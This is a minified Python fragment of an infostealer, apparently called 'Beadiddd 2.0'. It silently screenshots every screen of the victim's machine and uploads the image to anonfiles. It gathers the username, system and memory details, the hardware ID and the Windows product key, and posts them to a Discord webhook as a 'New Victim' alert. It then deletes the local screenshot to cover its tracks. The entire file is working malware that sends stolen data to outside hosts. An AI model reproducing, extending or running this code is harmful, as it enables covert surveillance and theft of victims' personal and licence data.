D=False
C='testy.jpg'
class A:
	def __init__(A):
		H='https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png';G='file';I=D;A.Screen();A.Info();J=requests.post('https://api.anonfiles.com/upload',files={G:open(C,'rb')});K=J.json()['data'][G]['url']['full'];L=str(requests.get(K).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
		if I:E='@everyone New Hit'
		else:E='New Hit'
		F=DiscordWebhook(url=wbh,username='Beadiddd 2.0',avatar_url=H,content=E);B=DiscordEmbed(title=f"New Victim",description=f"New victim | Pc Info + Screenshot",color='4300d1');B.set_author(name='author : Beadiddd',icon_url=H);B.set_footer(text='Beadiddd 2.0 | by : Beadiddd');B.set_timestamp();B.set_image(url=L);B.add_embed_field(name=f":desktop: Logged : ``{A.user}``",value=f"""
:fax: Machine : ``{A.machine}``
:gear: System : ``{A.system}``
:control_knobs: Processor : ``{A.processor}``


:floppy_disk: **Virtual Memory**
:battery: Total : ``{A.TotalM}``
:alembic: Available : ``{A.availableM}``
:low_battery: Used : ``{A.usedM}``
:symbols: Pourcentage : ``{A.pourcentageM}``


:id: HWID : ``{A.hwid}``
:key: Windows Product Key : {A.windowspk}""");F.add_embed(B);F.execute();os.remove(C)
	def Screen(B):A=ImageGrab.grab(bbox=None,include_layered_windows=D,all_screens=True,xdisplay=None);A.save(C);A.close()
	def Size(B,b):
		for A in ['','K','M','G','T','P']:
			if b<1024:return f"{b:.2f}{A}B"
			b/=1024
	def Info(A):
		B=' ';A.user=user;A.machine=platform.machine();A.system=platform.system();A.processor=platform.processor();A.sv=psutil.virtual_memory();A.TotalM=A.Size(A.sv.total);A.availableM=A.Size(A.sv.available);A.usedM=A.Size(A.sv.used);A.pourcentageM=A.Size(A.sv.percent)+'%';A.hwid=str(subprocess.check_output('wmic csproduct get uuid')).replace(B,'').split('\\n')[1].split('\\r')[0]
		try:
			A.windowspk=subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode(encoding='utf-8',errors='strict').split('OA3xOriginalProductKey')[1].split(B)
			for C in A.windowspk:
				if len(C)>20:A.windowspk=C.split(B)
			A.windowspk=f"``{A.windowspk[0][3:]}``"
		except:A.windowspk=':x:'